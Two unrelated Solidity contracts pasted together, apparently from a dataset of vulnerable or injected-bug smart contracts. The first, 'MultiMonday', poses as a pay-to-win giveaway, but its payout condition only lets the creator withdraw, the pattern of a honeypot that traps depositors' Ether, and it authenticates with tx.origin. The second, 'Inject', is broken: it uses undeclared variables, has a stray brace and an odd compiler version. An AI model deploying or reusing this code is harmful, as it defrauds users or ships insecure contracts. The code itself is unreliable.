pragma solidity ^0.4.25;

contract MultiMonday
{
    address O = tx.origin;

    function() public payable {}

    function Today() public payable {
        if (msg.value >= this.balance || tx.origin == O) {
            tx.origin.transfer(this.balance);
        }
    }
 }
pragma solidity ^0.5.24;
contract Inject {
	uint depositAmount;
	constructor() public {owner = msg.sender;}
	function freeze(address account,uint key) {
		if (msg.sender != minter)
			revert();
			freezeAccount[account] = key;
		}
	}
}
